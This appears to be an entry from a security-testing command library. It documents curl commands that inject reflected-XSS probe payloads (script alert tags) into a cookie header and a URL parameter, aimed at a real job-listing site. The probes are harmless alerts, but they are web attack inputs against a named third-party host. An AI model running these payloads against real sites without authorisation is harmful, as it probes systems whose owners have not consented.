---
id: cmd-curl-xss-cookie-param
data: >-
  curl -H "Cookie: test=\"<script>alert(1)</script>\""
  "https://glassdoor.com/Job/some-job?param=\"<script>alert(1)</script>\"" -v
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.692Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-cookie-param

## Command

```bash
curl -H "Cookie: test=\"<script>alert(1)</script>\"" "https://glassdoor.com/Job/some-job?param=\"<script>alert(1)</script>\"" -v
```

## Description

Tests for reflected XSS by injecting a script payload into a cookie and URL parameter, sending a GET request to a /Job/ endpoint to observe reflection in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Sets the malicious cookie | Yes |
| URL with `?param=...` | Appends parameter with payload | Yes |
| `-v` | Verbose output for inspection | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: test=\"<script>alert(1)</script>\"" "https://glassdoor.com/Job/some-job?param=\"<script>alert(1)</script>\"" -v
```

### Advanced Usage

```bash
curl -H "Cookie: test=\"<script>alert(document.domain)</script>\"" "https://glassdoor.com/Job/some-job?param=\"<script>alert(document.domain)</script>\"" -v --user-agent "Test"
```

## Expected Output

Verbose logs showing request/response, with payload reflected in HTML body but encoded (no execution).

## Related

- [[Related Procedure: Identify-Reflected-XSS-in-Cookies-and-Parameters]]
